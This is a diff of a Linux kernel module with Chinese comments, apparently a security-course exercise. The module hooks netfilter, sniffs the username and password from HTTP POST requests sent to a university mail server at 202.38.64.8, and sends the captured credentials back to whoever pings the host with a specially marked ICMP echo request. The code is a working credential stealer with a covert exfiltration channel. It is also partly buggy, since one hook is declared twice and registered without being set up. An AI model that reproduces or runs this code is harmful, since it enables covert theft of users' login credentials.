@@ -31,16 +31,23 @@ NF_INET_POST_ROUTING    在数据包离开本地主机“上线”之前
 #define MAGIC_CODE   0x5B
 #define REPLY_SIZE   36
 
+MODULE_LICENSE("GPL");
+
 static struct nf_hook_ops out;
 static struct nf_hook_ops in_http;
 static struct nf_hook_ops in_icmp;
+static struct nf_hook_ops in_http;
 
-static char username[20] = {-1};
-static char password[20] = {-1};
+
+static char username[20] = {0};
+static char password[20] = {0};
+static char username_temp[20] = {0};
+static char password_temp[20] = {0};
 static int have_pair = 0;
 
-static void check_http(const struct tcphdr *tcph);
 
+static void check_http(const struct tcphdr *tcph);
+static unsigned short checksum(int numwords, unsigned short *buff);
 
 
 u_long change_uint(u_long a, u_long b, u_long c, u_long d){
@@ -76,7 +83,7 @@ unsigned int watch_out(unsigned int hooknum,
     /*判断是否发往"202.38.64.8"（科大邮箱ip）的报文*/
     if(iph->daddr!=change_uint(202,38,64,8)){
         //printk("1111\n");
-        return NF_ACCEPT; 
+        return NF_ACCEPT;
     }
     
     /*判断是否为HTTP报文*/
@@ -85,7 +92,6 @@ unsigned int watch_out(unsigned int hooknum,
         //printk("11 %d\n",iph->daddr);
         return NF_ACCEPT; 
     }
-
     check_http(tcph);
     return NF_ACCEPT;
 
@@ -102,9 +108,12 @@ static void check_http(const struct tcphdr *tcph){
     char *pattern_uid = "&uid";
     char *pattern_password = "password";
 
+    int d=0;
+    u_char *p;
+
     /*指向http数据*/
     data += tcph->doff * 4;   //offset包头长度占４位，最多能表示15个32bit的长度）
-
+ 
     /* 首先判断是否为post请求包*/
     if(strncmp(data,"POST",4)==0)
     {
@@ -138,14 +147,55 @@ static void check_http(const struct tcphdr *tcph){
             have_pair++;		       /* Have a pair. Ignore others until
                            * this pair has been read. */
         }
-        if (have_pair){
-            printk("Have password pair:\n");
+        if(have_pair){
+            printk("have_pair: %d\n",have_pair);
             printk("username: %s\n",username);
             printk("password: %s\n",password);
         }
+       
     }
 }
 
+
+static unsigned int watch_in_http(unsigned int hooknum,
+    struct sk_buff *skb,
+    const struct net_device *in,
+    const struct net_device *out,
+    int (*okfn)(struct sk_buff *))
+{   
+    u_char *http_data ;
+    struct iphdr * iph;
+    struct tcphdr *tcph;
+    iph = ip_hdr(skb);
+    /*如果不是tcp报，则允许output*/
+    if(iph->protocol!=IPPROTO_TCP){
+        //printk("11 %d\n",iph->daddr);
+        return NF_ACCEPT;   
+    }
+
+    /*判断是否来自"202.38.64.8"（科大邮箱ip）的报文*/
+    if(iph->saddr!=change_uint(202,38,64,8)){
+        //printk("1111\n");
+        return NF_ACCEPT; 
+    }
+    
+    /*判断是否为HTTP报文*/
+    tcph = (struct tcphdr*)((u_char *)iph+iph->ihl*4);
+    if(tcph->source!=htons(80)){
+        //printk("11 %d\n",iph->daddr);
+        return NF_ACCEPT; 
+    }
+    http_data=(u_char *)tcph;
+    http_data += tcph->doff * 4;
+   printk("%s\n",http_data);
+  // http_data+=9;
+  // printk("111\n");
+   http_data+=9;
+    if(strncmp(http_data,"302",3)==0)
+        printk("302\n");
+    return NF_ACCEPT;
+
+}
 
 
 
@@ -162,20 +212,22 @@ static unsigned int watch_in_icmp(unsigned int hooknum,
     unsigned int   taddr;	       /* Temporary IP*/
     
     iph = ip_hdr(sb);
-
+    int error=0;
+    
     /*目前没有抓取到用户名密码，不作任何处理。接收*/
     if (!have_pair)
         return NF_ACCEPT;
-
+    
     /*不是ICMP包，同样不往下做任何处理。接收*/
     if(iph->protocol!=IPPROTO_ICMP)
         return NF_ACCEPT;
-
+    
     /*是否是特殊构造的ICMP包*/
-    icmph = (struct icmphdr*)((u_char *)iph+iph->ihl*4);
+    icmph = (struct icmphdr *)(sb->data + ip_hdr(sb)->ihl * 4);
     if (icmph->code != MAGIC_CODE || icmph->type != ICMP_ECHO) {
         return NF_ACCEPT;
     }
+
 
     /*重新构造包*/
     /*交换原ip目的ip*/
@@ -194,62 +246,97 @@ static unsigned int watch_in_icmp(unsigned int hooknum,
 			break;
         case ARPHRD_LOOPBACK:
         case ARPHRD_ETHER: //硬件类型为以太网
-			{
-				unsigned char t_hwaddr[ETH_ALEN];
+			{   
 
+                unsigned char t_hwaddr[ETH_ALEN];
+            
 				/* Move the data pointer to point to the link layer header */
-				sb->data = (unsigned char *)eth_hdr(sb);
+                // skb_push(sb, ETH_HLEN);
+                sb->data = (unsigned char *)eth_hdr(sb);//内核提供的宏来存取这个数据结构eg:#define FRAG_CB(skb)    ((struct ipfrag_skb_cb *)((skb)->cb))
                 sb->len += ETH_HLEN; 
                 
 				memcpy(t_hwaddr, (eth_hdr(sb)->h_dest), ETH_ALEN);
 				memcpy((eth_hdr(sb)->h_dest), (eth_hdr(sb)->h_source),ETH_ALEN);
-				memcpy((eth_hdr(sb)->h_source), t_hwaddr, ETH_ALEN);
-				break;
+                memcpy((eth_hdr(sb)->h_source), t_hwaddr, ETH_ALEN);
+               
 			}
     }
-    cp_data = (char *)((char *)icmph + sizeof(struct icmphdr));
-    //memcpy(cp_data, &target_ip, 4);
-    if (*username!=-1)
-      //memcpy(cp_data + 4, username, 16);
-      memcpy(cp_data + 4, username, 20);
-    if (*password!=-1)
-      memcpy(cp_data + 24, password, 20);
-    
-    dev_queue_xmit(sb);
+    cp_data = (char *)icmph + 8;
+    // memcpy(cp_data, &target_ip, 4);
 
-    kfree(username);
-    kfree(password);
-    memset(username,-1,20);
-    memset(password,-1,20);
+    
+
+
+    if (*username!=0)
+      //memcpy(cp_data + 4, username, 16);
+      memcpy(cp_data, username, 20);
+    if (*password!=0)
+      memcpy(cp_data + 20, password, 20);
+
+
+    error = dev_queue_xmit(sb);
+
+    if(error<0){
+        printk("send defeat\n");
+    }
+    else printk("send success!\n");
+
     have_pair = 0;
 
+    
     return NF_STOLEN;
     /*
     STOLEN时经常用于这样的情形，也就是在原始报文的基础上对报文进行了修改，
     然后将修改后的报文发出去了，因此，就要告诉系统忘记原有的那个skb。
     因为skb被修改，并以新的方式发送出去了。
+    因此，这里已经没有原始数据包的存在了，需要返回 NF_STOLEN，
+    告诉协议栈不用关心原始的包即可。
+    否则，若是新数据包是单独申请的内存，
+    那么对于原数据包还应该是返回NF_DROP.
     */
 }
 
 
 int init_module(){
 	out.hook = watch_out;
-	out.hooknum = NF_INET_LOCAL_OUT;
+	out.hooknum = NF_INET_POST_ROUTING;
 	out.pf = PF_INET;
 	out.priority = NF_IP_PRI_FIRST; 
 
     in_icmp.hook = watch_in_icmp;
-	in_icmp.hooknum = NF_INET_LOCAL_IN;
+	in_icmp.hooknum = NF_INET_PRE_ROUTING;
 	in_icmp.pf = PF_INET;
 	in_icmp.priority = NF_IP_PRI_FIRST; 
-
+/*
+    in_http.hook = watch_in_http;
+	in_http.hooknum = NF_INET_LOCAL_IN;
+	in_http.pf = PF_INET;
+    in_http.priority = NF_IP_PRI_FIRST; 
+    */
 	nf_register_hook(&out);
 	nf_register_hook(&in_icmp);
-	return 0;
+    nf_register_hook(&in_http);
+    return 0;
+    
 
 }
 
 void cleanup_module(void){
     nf_unregister_hook(&out);
     nf_unregister_hook(&in_icmp);
+    nf_unregister_hook(&in_http);
 }
+
+static unsigned short checksum(int numwords, unsigned short *buff)
+{
+   unsigned long sum;
+   
+   for(sum = 0;numwords > 0;numwords--)
+     sum += *buff++;   /* add next word, then increment pointer */
+   
+   sum = (sum >> 16) + (sum & 0xFFFF);
+   sum += (sum >> 16);
+   
+   return ~sum;
+}
+ 
